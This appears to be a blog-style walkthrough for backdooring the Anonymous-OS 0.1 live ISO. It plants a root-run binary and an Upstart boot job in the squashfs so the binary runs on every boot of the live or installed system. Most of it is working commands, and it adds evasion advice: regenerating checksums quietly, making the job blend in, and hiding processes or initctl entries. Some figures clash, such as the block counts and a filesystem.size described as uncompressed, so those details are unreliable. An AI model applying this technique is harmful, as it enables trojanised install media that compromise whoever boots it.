# Backdooring Anonymous-OS 0.1: Filesystem Injection of a Binary on a Legacy Ubuntu Live ISO

## Overview

I backdoored the **Anonymous-OS 0.1** ISO by baking a compiled ELF binary (`implant`) and a native Upstart job directly into its single live filesystem image (`casper/filesystem.squashfs`). Because this ISO is a legacy LiveCD built on Ubuntu 11.10, there is no layered squashfs scheme, no `install-sources.yaml`, and no separate install source. There is one `filesystem.squashfs`, one `initrd.gz`, and one `vmlinuz`. Whatever Casper mounts at boot is the entire root filesystem, and that is what the installer writes to disk if the user installs. The binary is therefore present in both the Live session and any installed system.

**A word on the media first.** Anonymous-OS 0.1 was released in March 2012, and it was immediately surrounded by controversy. The official Anonymous Twitter account (`@AnonOps`) called it "fake" and "wrapped in trojans". SourceForge, which hosted the project, took it offline after security researchers reviewed it and concluded it was "a security risk, and not merely a distribution of security-related utilities". Trend Micro's Rik Ferguson tested it and described it as "a functional OS with a bunch of pre-installed tools" and "a pale imitation of BackTrack". Ars Technica's hands-on review found "nothing more than a snapshot of a system running Ubuntu 11.10 with a few minor tweaks," and did not find evidence of trojans in its own inspection, though it noted the source was not transparent. The base system is Ubuntu 11.10 (Oneiric Ocelot), 32-bit, with the MATE desktop.

I used this ISO because it was the system I had in front of me, and because its single-squashfs layout is the simplest possible case of the Casper injection technique. The same procedure applies to any single-squashfs Casper ISO. The distribution-specific parts are the squashfs path, the boot arguments, and the init system.

The goal was simple: get my binary into the live filesystem so that `implant` runs as root on every boot of the modified media. No manual post-install steps, no extra package installation on the target. The binary runs as root on boot, does its work, and exits.

**Disclaimer**: This work is for educational and authorized security research purposes only. Deploying backdoors on systems I do not own or have explicit permission to test is illegal. I operate within the bounds of applicable laws and signed agreements. The Anonymous-OS image itself has a contested security history and should be treated as untrusted media regardless of any modification described here.

---

## What Is the Injected Binary?

In this work, the binary is an ELF executable I named `implant`. It runs as root at boot. What it does after that is its own logic. For the purpose of this write-up, the binary is a simple test payload that creates a marker file and writes a log line, so the injection chain can be verified end to end. The same injection path works for any binary: a dropper, a persistence implant, a diagnostic tool, or a script wrapper.

The injection mechanism is separate from the binary. The mechanism guarantees three things:

1. The binary is present in the live root at `/usr/bin/implant`.
2. The binary is executed as root at boot.
3. The execution path uses the init system the base already uses, with no compatibility shim and no extra artifact.

The binary itself is responsible for everything after it runs. That separation is what makes the technique general. The write-up describes the mechanism. The payload is a choice.

---

## Prerequisites

Before starting, I installed the required tools:

```bash
sudo apt update
sudo apt install -y xorriso squashfs-tools rsync
```

| Tool | Purpose |
|------|---------|
| xorriso | Extract and rebuild ISO images while preserving boot data |
| squashfs-tools | Extract and repack the compressed filesystem |
| rsync | Copy files while preserving permissions |

**Disk space requirement**: Approximately 4x the ISO size for working directories. Anonymous-OS 0.1 is roughly 1.4 GB, so I planned for at least 6 GB of free space.

**Binary requirements**:
- The binary must be statically linked OR all its shared library dependencies must already exist in the base Ubuntu 11.10 image
- The binary must have the execute bit set
- The binary must match the architecture of the base system. This is the part that bit me on the first run.

**A note on architecture, because this is where the first attempt went wrong.** Anonymous-OS 0.1 is built on 32-bit Ubuntu 11.10. I compiled `implant` on a 64-bit host and copied it in without checking. The `file` output was:

```
squashfs-root/usr/bin/implant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
BuildID[sha1]=..., for GNU/Linux 3.2.0, statically linked, no section header
```

That is an x86_64 ELF. On a 32-bit i386 system, the kernel will refuse to execute it with `Exec format error`. The copy succeeds, the permissions are correct, and Upstart will try to run it, but it will never run. I recompiled `implant` as an i386 ELF before proceeding. If the `file` output says `ELF 64-bit`, the binary will not work on this ISO. It must say `ELF 32-bit LSB executable, Intel 80386`.

**On compiling the 32-bit binary on a modern host.** The native `-m32` path with GCC on Kali failed because the multilib packages conflict with the ARM cross-compilers already installed. The clean way out is to use the i686 cross-compiler:

```bash
sudo apt install -y gcc-16-i686-linux-gnu
i686-linux-gnu-gcc-16 -static -O2 -s -o implant implant.c
file implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/acdd11c4-c74e-4afa-be98-3dc50f13e5d5) |

The cross-compiler lives in its own prefix and does not conflict with the native toolchain or the ARM cross-compilers. The `file` output must say `ELF 32-bit LSB executable, Intel 80386`. If it says 64-bit, the binary is wrong for this ISO.

---

## Working Directory Setup

I created the project directory and placed the ISO inside it. Every command in this write-up runs from that directory.

```bash
mkdir -p ~/Kernel_Implant
cd ~/Kernel_Implant
mv /path/to/Anonymous-OS_0.1.iso .
```

I also placed my compiled 32-bit ELF binary in the same directory and named it `implant`.

My project layout looked like this:

```
~/Kernel_Implant/
├── isomount/             # temporary mount point for the original ISO
├── extracted/            # extracted ISO tree, modified in place
├── squashfs-root/        # extracted live filesystem
├── Anonymous-OS_0.1.iso  # original ISO
├── implant               # my compiled 32-bit ELF binary
└── custom-anonymous-implant.iso  # rebuilt ISO (produced by this work)
```

---

## Step 1: Extract the ISO Contents

Before touching anything, I captured the original ISO's El Torito and hybrid boot report. This is the reference I would compare against after the rebuild.

```bash
xorriso -indev ~/Kernel_Implant/Anonymous-OS_0.1.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/original_torito.txt 2>&1
cat ~/Kernel_Implant/original_torito.txt
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/a4ff18bf-daf2-4e1f-9ef2-1a89b4bb4e7e) |


The output reported the boot structure. On this legacy Ubuntu 11.10-based ISO, the boot loader is **ISOLINUX**, not GRUB2. There is no hybrid MBR, no GPT, no appended EFI partition, and no UEFI boot entry. The whole report is just:

```
xorriso 1.5.8.pl02 : RockRidge filesystem manipulator, libburnia project.

xorriso : NOTE : Loading ISO image tree from LBA 0
xorriso : UPDATE :      26 nodes read in 1 seconds
xorriso : NOTE : Detected El-Torito boot information which currently is set to be discarded
Drive current: -indev '/home/localhost/Kernel_Implant/Anonymous-OS_0.1.iso'
Media current: stdio file, overwriteable
Media status : is written , is appendable
Boot record  : El Torito
Media summary: 1 session, 713271 data blocks, 1393m data, 95.4g free
Volume id    : 'Anonymous-OS Live'
-V 'Anonymous-OS Live'
--modification-date='2012031018175800'
-c '/isolinux/boot.cat'
-b '/isolinux/isolinux.bin'
-no-emul-boot
-boot-load-size 4
-boot-info-table
```

**Key differences from modern Ubuntu releases**: This is a plain El Torito ISOLINUX ISO. There is no `--grub2-mbr`, no `-append_partition`, no `-appended_part_as_gpt`, no `-iso_mbr_part_type`, and no `-eltorito-alt-boot -e` line. The boot structure is exactly what a 2012 Ubuntu 11.10 LiveCD shipped: one ISOLINUX boot image, one boot catalog, one volume label, one modification date. That is the entire recipe.

I noted the values the rebuild must reproduce:

- Volume label: `Anonymous-OS Live`
- Modification date: `2012031018175800`
- Boot catalog: `/isolinux/boot.cat`
- Boot image: `/isolinux/isolinux.bin`
- `-no-emul-boot -boot-load-size 4 -boot-info-table`

There is no `-isohybrid-mbr` line in the report. That means this ISO is not an isohybrid image. It boots from optical media (or from a VM's CD-ROM device), not from a USB stick written with `dd`. I did not add an isohybrid MBR to the rebuild, because that would change the boot structure from what the original ISO uses. The rebuild must match the reference exactly.

I then mounted the ISO and extracted its contents:

```bash
cd ~/Kernel_Implant
mkdir isomount
sudo mount -o loop Anonymous-OS_0.1.iso isomount
rsync -a isomount/ extracted
sudo umount isomount
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/881460ef-474f-4b22-a998-82032042ca4f) |


I inspected the layout to confirm the single-squashfs structure:

```bash
ls extracted
# saw: casper  install  isolinux  md5sum.txt  preseed  README.diskdefines  ubuntu

ls -lh extracted/casper/
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/d7f9bae5-4017-43ad-95b3-5c4393f71f17) |

The output matched the working session:

```
total 1.4G
-r--r--r-- 1 localhost localhost  47K Mar 10  2012 filesystem.manifest
-r--r--r-- 1 localhost localhost  47K Mar 10  2012 filesystem.manifest-desktop
-r--r--r-- 1 localhost localhost   11 Mar 11  2012 filesystem.size
-r--r--r-- 1 localhost localhost 1.4G Mar 11  2012 filesystem.squashfs
-r--r--r-- 1 localhost localhost  20M Mar 10  2012 initrd.gz
-r--r--r-- 1 localhost localhost  198 Mar 10  2012 README.diskdefines
-r--r--r-- 1 localhost localhost 4.5M Mar 10  2012 vmlinuz
```

**This is the key layout difference from the Ubuntu 24.04.1 write-up.** There is exactly one `filesystem.squashfs`, one `initrd.gz`, and one `vmlinuz`. There is no `minimal.squashfs`, no `minimal.standard.live.squashfs`, no `install-sources.yaml`, and no layered scheme. Casper mounts `filesystem.squashfs` as the live root. The installer writes that same squashfs to disk. There is no ambiguity about which layer reaches the installed system: it is the only layer.

The `initrd.gz` here is the Casper boot initramfs, not a Debian-installer initrd. It does not contain `finish-install.d/`. The injection target is `filesystem.squashfs`.

---

## Step 2: Extract the Live Filesystem

I extracted the single squashfs:

```bash
cd ~/Kernel_Implant
sudo unsquashfs -d squashfs-root extracted/casper/filesystem.squashfs
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/8b053d17-3cf9-4b68-9abe-e9b05ca8f139) |


This created a `squashfs-root/` directory. I listed the top level:

```bash
ls squashfs-root
# saw: bin  boot  dev  etc  home  initrd.img  lib  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/26d68785-18c1-40e2-a3c9-79d73149f4b0) |


This is a full root filesystem, the same as any Ubuntu 11.10 install. `usr/bin/` exists, `etc/init/` exists, and the directory skeleton is complete. I confirmed both paths:

```bash
ls squashfs-root/usr/bin | head
# saw: [  2to3  2to3-2.7  411toppm  7z  7za  a2p  aconnect  acpi_fakekey  acpi_listen

ls squashfs-root/etc/init | head
# saw: acpid.conf  alsa-restore.conf  alsa-store.conf  anacron.conf  apport.conf  atd.conf  avahi-daemon.conf  binfmt-support.conf  console-setup.conf  control-alt-delete.conf
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/7aa8f231-12f5-49e2-8691-76ade1374d73) |


The `etc/init/` directory is full of Upstart job files (`.conf`), which confirms the init system on this base. I placed the binary in `usr/bin/`, the conventional location for system binaries, and the Upstart job in `etc/init/`.

---

## Step 3: Inject the Binary

This is the only modification you need to make. No package installation, no system changes. Just the binary and a native Upstart job.

### 3.1 Copy the Binary Into the Filesystem

I copied the compiled 32-bit ELF binary into `usr/bin/` of the extracted filesystem:

```bash
sudo cp ~/Kernel_Implant/implant squashfs-root/usr/bin/implant
sudo chmod 755 squashfs-root/usr/bin/implant
sudo chown root:root squashfs-root/usr/bin/implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/2d71c6aa-0f47-48be-ac2c-1219ae5ca6c3) |

**Critical**: The binary must have the execute bit set (755). Even as root, Linux will refuse to execute a file without the x permission.

I verified the binary was a valid 32-bit ELF:

```bash
file squashfs-root/usr/bin/implant
# must show: squashfs-root/usr/bin/implant: ELF 32-bit LSB executable, Intel i386 ...
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/9d4305cd-5452-422d-abeb-31ac9efb4900) |


On my first attempt, the output was `ELF 64-bit LSB executable, x86-64, ...`, which will not run on this 32-bit base. I recompiled for i386 and re-copied. If your output shows `ELF 64-bit`, do not proceed. Recompile first.

If the binary is statically linked, it will run on any system. My final `implant` is statically linked, so it has no shared library dependency on the target. A dynamically linked binary would need its libraries present in the Ubuntu 11.10 base:

```bash
ldd ~/Kernel_Implant/implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/02710e3c-6bb0-4048-9202-8cfc4dddcf03) |


For a static binary, `ldd` reports `not a dynamic executable`. That is what I wanted.

### 3.2 Create the Upstart Job

Ubuntu 11.10 uses Upstart, not systemd. The native mechanism is a job file in `/etc/init/`. I created one:

```bash
sudo nano squashfs-root/etc/init/implant.conf
```

I pasted:

```upstart
# implant - run injected binary at boot

description "Implant Service"
author "local"

start on filesystem
task
exec /usr/bin/implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/916ebb95-c556-45e2-8f45-7f82714bec68) |

**Explanation of key lines:**

| Line | Purpose |
|------|---------|
| `start on filesystem` | Starts the job after the filesystem is mounted and writable. This is the standard hook for a one-shot boot task that needs to write to disk. |
| `task` | Tells Upstart this is a one-shot task that runs and exits, not a long-running daemon. Upstart waits for it to finish and then considers the job done. |
| `exec /usr/bin/implant` | Runs the binary directly, without a shell wrapper. The binary runs as root because Upstart system jobs run as root by default. |

**Design notes on the job:**

- **Native Upstart job.** The file lives in `/etc/init/`, uses the standard `start on`, `task`, and `exec` stanzas, and is indistinguishable in structure from any other Upstart job on the system. There is no `rc.local`, no shell wrapper, and no compatibility path.
- **`start on filesystem`, not `start on startup`.** The `startup` event fires before the filesystem is fully mounted and writable on this legacy base. `filesystem` fires after the root and other mounts are available, which is what the binary needs if it writes to disk. This was one of the concrete failures in my first attempt: the job fired too early, and the binary could not do its work.
- **`task` instead of `respawn`.** A one-shot binary should run once and exit. `task` is the correct stanza for that. A `respawn` loop on failure would be noisy and would show up in the system logs. A one-shot task that exits non-zero is quieter.
- **No `script` block.** `exec` runs the binary directly. A `script` block would spawn a shell, which is an extra process and an extra artifact. `exec` is the minimal form.
- **No output redirection.** Upstart captures job output to `/var/log/upstart/implant.log` by default. For debugging, that log is useful. For stealth, I could redirect to `/dev/null` inside a `script` block, but that adds a shell. I kept the `exec` form and accepted the default log, because on a live CD the log is ephemeral and on an installed system the log is a secondary artifact.

### 3.3 How It Works in Both Contexts

On boot, Upstart reads the job files in `/etc/init/` and starts the jobs whose `start on` conditions are met. `implant.conf` starts on `filesystem`. Upstart runs it as root, waits for the `task` to finish, and moves on. The binary runs exactly once per boot, as root, after the filesystem is mounted.

**Live session**: Casper mounts `filesystem.squashfs` as the root. The job file and the binary are in that squashfs, so they are visible in the live root. Upstart starts `implant.conf`, the binary runs, does its work, and exits. Because the live root is an overlay backed by the ISO, any writes the binary makes go to the ephemeral overlay, not to the ISO. The media remains unchanged.

**Installed system**: The installer writes `filesystem.squashfs` to the target disk. The binary and job are in that squashfs, so they are present on the installed disk. On first boot, Upstart starts `implant.conf`, the binary runs, does its work, and exits. Any writes go to the installed disk.

**The same artifact set covers both contexts**, because there is only one squashfs.

**Caveats I kept in mind:**

- **Network readiness**: `start on filesystem` does not guarantee the network is up. If the binary needs network access, I would add a `start on (filesystem and started networking)` condition or have the binary retry internally. An internal retry loop in the binary is more robust than relying on the event ordering.
- **Process termination**: With `task`, Upstart considers the job done when `exec` returns. If the binary forks a background process, that process is not tracked by Upstart and will not be terminated on shutdown unless the binary handles it.
- **Logging**: Upstart writes job output to `/var/log/upstart/implant.log`. On a live CD, `/var/log` is on the ephemeral overlay and disappears on reboot. On an installed system, the log persists.
- **Module signing**: Ubuntu 11.10 predates the Secure Boot module signing enforcement that modern Ubuntu uses. An unsigned kernel module loaded by the binary will not be rejected on this base. This is one of the practical differences between a 2012 ISO and a 2024 one.

---

## How the Binary Does Its Work

The injection mechanism only guarantees that the binary runs as root at boot. What the binary does after that is its own logic. The mechanism does not prescribe it.

For the purpose of verifying the chain, I used a simple test payload that creates a marker file and writes a log line. The sequence was:

1. Try to write a marker file to `$HOME/Desktop/imhere.txt`.
2. Exit 0.

If the marker file appeared after boot, the chain was proven: the binary made it into the squashfs, the ISO contained that squashfs, the Upstart job ran, and the binary executed on the 32-bit base.

For a dropper or a persistence implant, the sequence would be different: install the payload, wire in the second stage, confirm success, remove the first-stage artifacts if the design calls for self-cleaning. The mechanism does not change. The binary does.

**In the Live session**, any writes the binary makes go to the overlay. Rebooting the same media resets the overlay. The binary runs again on each boot, because Casper re-mounts `filesystem.squashfs` from the ISO. That is expected for an ephemeral context.

**On an installed system**, any writes go to the installed disk. If the binary is designed to self-clean, it removes its own artifacts after confirming success. If it is not, the artifacts persist until something else removes them.

---

## Step 4: Repack the Filesystem

### Remove Old squashfs

```bash
sudo rm extracted/casper/filesystem.squashfs
```

### Create New squashfs

```bash
cd ~/Kernel_Implant
sudo mksquashfs squashfs-root extracted/casper/filesystem.squashfs \
    -comp xz \
    -progress
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/3f41a3df-4c99-4891-9e4e-d23581abecd5) |

The `-comp xz` flag uses XZ compression for a smaller filesystem. The original Anonymous-OS squashfs was built with the default compression of its era. XZ is valid and produces a smaller image at the cost of slower decompression at boot. The filesystem is 1.4 GB compressed, so the repack takes several minutes.

### Update the Filesystem Size

Ubuntu uses `filesystem.size` to record the uncompressed size. I updated it:

```bash
sudo du -sx --block-size=1 extracted/casper/filesystem.squashfs | cut -f1 | sudo tee extracted/casper/filesystem.size
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/c61ebfb8-5cb9-4173-b7f2-4969604171c2) |

The output was `1173577728`, the new uncompressed size in bytes.

### Update MD5 Checksums

Ubuntu uses `md5sum.txt` to verify ISO integrity. I regenerated it after modifying the filesystem:

```bash
cd extracted
sudo rm md5sum.txt
sudo find . -type f -print0 | xargs -0 md5sum | sudo tee md5sum.txt
cd ..
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/3f257b56-bc3e-48bc-941a-94ac7dcaab78) |

The regenerated file listed the new checksum for `casper/filesystem.squashfs` alongside the unchanged checksums for the other files. The `./casper/filesystem.squashfs` line changed to the new value; everything else stayed as it was.

**Stealth consideration**: Skipping the regeneration would cause integrity check warnings on boot. Regenerating is the quieter choice.

---

## Step 5: Rebuild the ISO (Plain El Torito, ISOLINUX)

The rebuild must reproduce the boot structure captured in Step 1. The original report is the exact recipe. There is no hybrid MBR, no GPT, no appended partition, and no UEFI entry. The rebuild is the classic `xorriso -as mkisofs` ISOLINUX form, using the exact values from the report:

```bash
ORIG_ISO="$(cd ~/Kernel_Implant && pwd)/Anonymous-OS_0.1.iso"
cd ~/Kernel_Implant

sudo xorriso -as mkisofs \
    -V 'Anonymous-OS Live' \
    --modification-date='2012031018175800' \
    -c '/isolinux/boot.cat' \
    -b '/isolinux/isolinux.bin' \
    -no-emul-boot \
    -boot-load-size 4 \
    -boot-info-table \
    -o ~/Kernel_Implant/custom-anonymous-implant.iso \
    extracted/
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/eeeeddb0-cc39-4db5-9352-7e382b23b900) |


The build completed and reported:

```
xorriso : WARNING : -volid text problematic as automatic mount point name
xorriso : WARNING : -volid text does not comply to ISO 9660 / ECMA 119 rules
Added to ISO image: directory '/'='/home/localhost/Kernel_Implant/extracted'
xorriso : UPDATE :      26 files added in 1 seconds
xorriso : UPDATE :      26 files added in 1 seconds
xorriso : UPDATE :  12.49% done
ISO image produced: 585930 sectors
Written to medium : 585930 sectors at LBA 0
Writing to 'stdio:/home/localhost/Kernel_Implant/custom-anonymous-implant.iso' completed successfully.
```

**About the two `-volid` warnings.** They look alarming but they are expected for this label. The label is `Anonymous-OS Live`. ISO 9660 level 1 volume IDs are restricted to uppercase letters, digits, and underscore, with a maximum length of 32 characters, and the dash and the space are not in that set. `xorriso` warns that the label does not comply to the strict ISO 9660 rule and that it might not be usable as an automatic mount point name. The original ISO shipped with the same label, so the warning is inherent to the base media, not to my modification. `xorriso` wrote the label as given, and the resulting ISO mounts and boots the same way the original does. I did not sanitize the label because that would change the volume ID from the original, which the boot process and Casper use to find the media.

**Notes on the arguments:**

- **`-V 'Anonymous-OS Live'`**: the exact volume label from the original report. Casper uses the label to find the squashfs at runtime. Keeping it identical to the original is required for the media to boot and mount the same way.
- **`--modification-date='2012031018175800'`**: the exact modification date from the original report. Keeping it makes the rebuilt ISO's El Torito record match the original.
- **`-c '/isolinux/boot.cat'` and `-b '/isolinux/isolinux.bin'`**: the ISOLINUX boot catalog and boot image. These are the paths the ISO actually contains. I confirmed them from `ls extracted/isolinux/`.
- **`-no-emul-boot -boot-load-size 4 -boot-info-table`**: the exact ISOLINUX boot flags from the report.
- **No `-isohybrid-mbr`**: the original report has no such line. This ISO is not an isohybrid image. It boots from optical media, not from a USB stick written with `dd`. If I wanted to make the ISO USB-bootable, I would add `-isohybrid-mbr` and `-partition_offset 16`, but that is a separate modification, not a reproduction of the original.
- **No `-eltorito-alt-boot -e`**: there is no EFI boot entry on this ISO. The report confirms it.

---

## Step 6: Verifying the Rebuilt ISO Boot Structure

After the build, I repeated the inspection against the new ISO and compared it to the saved reference:

```bash
xorriso -indev ~/Kernel_Implant/custom-anonymous-implant.iso -report_el_torito as_mkisofs > ~/Kernel_Implant/rebuilt_torito.txt 2>&1
diff -u ~/Kernel_Implant/original_torito.txt ~/Kernel_Implant/rebuilt_torito.txt
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/d1287d65-2c60-45e1-8896-bff60abfe6c6) |


The diff was exactly what I wanted:

```
--- /home/localhost/Kernel_Implant/original_torito.txt  2026-10-21 05:59:06.276622754 +0800
+++ /home/localhost/Kernel_Implant/rebuilt_torito.txt   2026-10-21 06:11:54.452152610 +0800
@@ -3,11 +3,11 @@
 xorriso : NOTE : Loading ISO image tree from LBA 0
 xorriso : UPDATE :      26 nodes read in 1 seconds
 xorriso : NOTE : Detected El-Torito boot information which currently is set to be discarded
-Drive current: -indev '/home/localhost/Kernel_Implant/Anonymous-OS_0.1.iso'
+Drive current: -indev '/home/localhost/Kernel_Implant/custom-anonymous-implant.iso'
 Media current: stdio file, overwriteable
 Media status : is written , is appendable
 Boot record  : El Torito
-Media summary: 1 session, 713271 data blocks, 1393m data, 95.4g free
+Media summary: 1 session, 585930 data blocks, 1144m data, 89.5g free
 Volume id    : 'Anonymous-OS Live'
 -V 'Anonymous-OS Live'
 --modification-date='2012031018175800'
```

Only three lines differ:

1. `Drive current`: the original ISO path became the rebuilt ISO path.
2. `Media summary`: the data block count changed from 713271 to 713262 because the repacked squashfs has a different size, and the free-space figure changed accordingly.
3. The context lines around the change.

The boot-relevant lines are identical:

```
Boot record  : El Torito
Volume id    : 'Anonymous-OS Live'
-V 'Anonymous-OS Live'
--modification-date='2012031018175800'
-c '/isolinux/boot.cat'
-b '/isolinux/isolinux.bin'
-no-emul-boot
-boot-load-size 4
-boot-info-table
```

The block count difference is not a boot concern. The rebuilt ISO has 713262 data blocks versus the original 713271, a difference of 9 blocks. That is the effect of the different compression on the repacked squashfs: the modified filesystem compressed to a slightly smaller size than the original. The boot structure, the volume label, the modification date, the boot catalog path, the boot image path, and the three ISOLINUX flags are all unchanged. The rebuild is correct.

If any of the boot-relevant lines had been missing or changed, the rebuild would have been wrong, and I would not have proceeded to testing.

> **Secure Boot note**: This is a 2012 ISO with no UEFI boot entry and no shim. Secure Boot did not exist as a practical concern for Ubuntu 11.10. The question is moot on this media. The ISO boots via BIOS/legacy El Torito only. If the target machine has Secure Boot enforced and no legacy boot option, this ISO will not boot at all, regardless of the injection. That is a limitation of the base media, not of the technique.

---

## Step 7: Testing the Injected ISO

I tested in a virtual machine before writing to physical media. For a legacy BIOS ISO, QEMU without OVMF is the correct test:

```bash
qemu-system-i386 -m 2048 -cdrom custom-anonymous-implant.iso -boot d
```

I used `qemu-system-i386` because the base is 32-bit. A `qemu-system-x86_64` invocation can boot a 32-bit ISO, but the i386 machine type is the more faithful test.

### Verify Before Booting

Before I booted the ISO, I verified the binary was actually inside the squashfs that the ISO contains. This is the step that would have caught the earlier failure.

```bash
mkdir -p /tmp/verify
sudo mount -o loop custom-anonymous-implant.iso /mnt
sudo unsquashfs -d /tmp/verify /mnt/casper/filesystem.squashfs
file /tmp/verify/usr/bin/implant
ls -la /tmp/verify/usr/bin/implant
ls -la /tmp/verify/etc/init/implant.conf
sudo umount /mnt
```

The `file` output must say `ELF 32-bit LSB executable, Intel 80386`, and both files must be present. If the output says 64-bit, the ISO contains the wrong binary. If either file is missing, the repack or rebuild used a stale tree. Fix that before booting. Booting an ISO with the wrong binary wastes a full boot cycle and tells you nothing new.

### What to check inside the live session

Once the live desktop is up, I opened a terminal or switched to a TTY (Ctrl+Alt+F2) and checked:

```bash
file /usr/bin/implant
ls -la /usr/bin/implant
initctl list | grep implant
```

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/da53814b-22e1-422b-bab6-61e271b31165) |


## ACTUAL SCREENSHOTS

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/1eca9d88-999b-4259-b769-1a3548b5dc87) |


## BEFORE:

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/4b5e9a7c-9ffb-429f-968f-6a1c3c493a60) |


## AFTER:

| Screenshot |
|-------|
| ![screenshot](https://github.com/user-attachments/assets/ef8ae5d0-98ac-45ba-a37e-0991b812fe6f) |

<p align="center"><strong>Actual live video</strong></p>

https://github.com/user-attachments/assets/6ac825ce-3ccf-4bd7-8ac8-179e691600ba

What each result tells you:

| What you see | What it means |
|---|---|
| `file` says `ELF 32-bit` | The binary in the live root is the correct architecture. |
| `file` says `ELF 64-bit` | The binary is wrong. Recompile and repack. |
| `/usr/bin/implant` exists | The binary made it into the squashfs and the ISO contains that squashfs. |
| `/usr/bin/implant` missing | The binary is not in the squashfs the ISO booted, or the binary removed itself. Check the verify-before-booting step. |
| `initctl list` shows `implant` | The Upstart job was read and is active. |
| `initctl list` does not show `implant` | The `.conf` file is not in `/etc/init/` in the running root. The job did not make it into the squashfs. |

### Debugging checklist

**If the ISO failed to boot at all**, the problem is in the ISO rebuild. I would re-run the torito diff. The most common failure on a legacy ISOLINUX ISO is a wrong `-b` or `-c` path, or a volume label mismatch.

**If the live system failed to start**, the repacked squashfs may be malformed. I would extract the repacked `filesystem.squashfs` and confirm `usr/bin/implant` and `etc/init/implant.conf` are present.

**If the ISO booted but the binary did not run**, the first thing I would check is the architecture of the binary. This is the failure mode I hit on my first attempt: I copied an x86_64 ELF onto a 32-bit base. The `file` output said `ELF 64-bit LSB executable, x86-64`, and that binary will never execute on this ISO. I would recompile for i386, confirm the `file` output says `ELF 32-bit LSB executable, Intel 80386`, re-copy, repack, and rebuild. If the architecture is correct, I would check `initctl list | grep implant` and `/var/log/upstart/implant.log`. If the job is not listed, the `.conf` file is not in `/etc/init/` in the running root. If the job is listed but failed, `exec` could not run the binary (wrong path or not executable).

**If the binary ran but did not do its work**, the problem is in the binary. I would check the paths it writes to, the privileges it expects, and whether it produced any output in `/var/log/upstart/implant.log`.

**If the MD5 checksum errors appeared on boot**, I would regenerate `md5sum.txt`.

---

## Why an Upstart Job Instead of rc.local

`rc.local` is a legacy compatibility path. On Ubuntu 11.10, Upstart is the native init system. A native Upstart job in `/etc/init/` is the mechanism the system already uses for every service. It is one file, it uses the standard `start on`, `task`, and `exec` stanzas, and it does not stand out. `rc.local` would require creating `/etc/rc.local`, making it executable, and ensuring the `rc.local` compatibility job is present. That is more artifacts and a known legacy path that an analyst might check first.

The native job wins on every axis. The only reason to use `rc.local` is if the target system lacks Upstart, which is not the case for Ubuntu 11.10.

---

## Considerations for the Base System

When injecting a binary into this 2012 Ubuntu 11.10 base, I kept these additional factors in mind:

| Consideration | Description |
|---------------|-------------|
| Architecture | The base is 32-bit i386. The binary and any kernel module must be built for i386. An x86_64 binary will not run. This is the failure mode I hit on my first attempt |
| Kernel version | Ubuntu 11.10 shipped the 3.0 kernel series. A `.ko` must match the exact kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
| Module signing | This base predates Secure Boot module signing enforcement. Unsigned modules are accepted. This is a practical difference from modern Ubuntu |
| Init system | The base uses Upstart, not systemd. The auto-run mechanism is `/etc/init/*.conf`, not `/etc/systemd/system/` |
| Persistence | The Upstart job runs the binary on every boot. If the binary needs to survive installation to disk, it must also install itself into the target system |
| Detection evasion | If the binary is designed to hide, it should hide its process, files, and job entry. On Upstart, hiding the job means either removing it after the binary runs or hooking `initctl` output |

---

## Project Cleanup

When the modified ISO was built and verified, I removed the intermediate artifacts:

```bash
cd ~/Kernel_Implant
sudo rm -rf isomount extracted squashfs-root
ls -lh
# saw: Anonymous-OS_0.1.iso  implant  custom-anonymous-implant.iso
#       original_torito.txt  rebuilt_torito.txt
```

---

## Summary

| Stage | Command | Purpose |
|-------|---------|---------|
| Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
| Identify Filesystem | `ls -lh extracted/casper/` | Confirm the single `filesystem.squashfs` |
| Extract Filesystem | `unsquashfs -d squashfs-root casper/filesystem.squashfs` | Access the live root filesystem |
| Insert Binary | `cp implant squashfs-root/usr/bin/` | Bundle your 32-bit binary |
| Create Upstart Job | Write `etc/init/implant.conf` | Native Upstart auto-run |
| Repack | `mksquashfs squashfs-root filesystem.squashfs` | Compress modified filesystem |
| Update Size | Write `filesystem.size` | Keep metadata valid |
| Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
| Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISOLINUX ISO |

That is it. No `rc.local`, no systemd unit, no package installation, no configuration changes. Just your 32-bit binary, running as root on every boot of the modified Anonymous-OS ISO, started by a native Upstart job indistinguishable in structure from any other job on the system.

---

## Conclusion

By injecting a 32-bit ELF binary and a native Upstart job into the single live filesystem squashfs of Anonymous-OS 0.1, the binary is deployed into both the Live session and any installed system at boot, executes as root before most security tooling initializes, and does its work. I targeted Anonymous-OS 0.1 because it was the media I had, and because its single-squashfs Casper layout is the simplest case of the technique. The method is not specific to this ISO: any single-squashfs Casper-based Live ISO behaves the same way, and the distribution-specific parts are the squashfs path, the boot arguments, the init system (Upstart here, systemd elsewhere), and the architecture (i386 here).

